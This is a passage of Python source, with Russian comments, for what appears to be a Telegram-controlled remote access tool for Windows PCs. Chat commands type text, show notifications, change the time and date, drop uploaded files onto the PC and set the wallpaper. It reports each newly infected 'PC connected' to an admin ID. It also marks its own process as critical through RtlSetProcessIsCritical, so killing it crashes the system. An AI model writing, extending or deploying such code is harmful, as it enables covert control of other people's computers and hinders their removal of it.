        context.user_data['type_text_mode'] = False
        bot.send_message(chat_id, type_text(text))
    elif context.user_data.get('notification_mode'):
        context.user_data['notification_mode'] = False
        bot.send_message(chat_id, show_notification(text))
    elif context.user_data.get('set_time_mode'):
        context.user_data['set_time_mode'] = False
        bot.send_message(chat_id, set_time(text))
    elif context.user_data.get('set_date_mode'):
        context.user_data['set_date_mode'] = False
        bot.send_message(chat_id, set_date(text))

def handle_document(update, context):
    chat_id = update.message.chat.id
    doc = update.message.document
    
    # Загрузка файла через Upload File
    if context.user_data.get('awaiting_upload'):
        context.user_data['awaiting_upload'] = False
        file = bot.get_file(doc.file_id)
        file_data = file.download_as_bytearray()
        bot.send_message(chat_id, upload_file_to_pc(file_data, doc.file_name))
        return
    
    # Установка обоев через кнопку Set Wallpaper
    elif context.user_data.get('awaiting_wallpaper'):
        context.user_data['awaiting_wallpaper'] = False
        set_wallpaper_from_document(update, context)
        return
    
    # АВТОМАТИЧЕСКАЯ установка обоев из любой картинки
    if doc.mime_type and doc.mime_type.startswith('image/'):
        set_wallpaper_from_document(update, context)
        return
    
    # Обычный файл
    else:
        bot.send_message(chat_id, "📄 Файл получен. Используй Upload File для загрузки.")

# Добавляем текущий ПК в список известных
if PC_ID not in known_pcs:
    known_pcs.append(PC_ID)
    try:
        bot.send_message(ADMIN_ID, f"🟢 New PC connected: {PC_ID}\nИспользуй команду /list для выбора")
    except:
        pass

dp.add_handler(CommandHandler("start", start))
dp.add_handler(CallbackQueryHandler(callback))
dp.add_handler(MessageHandler(Filters.document, handle_document))
dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))

try:
    ctypes.windll.ntdll.RtlSetProcessIsCritical(True, False, False)
except:
    pass

updater.start_polling()
updater.idle()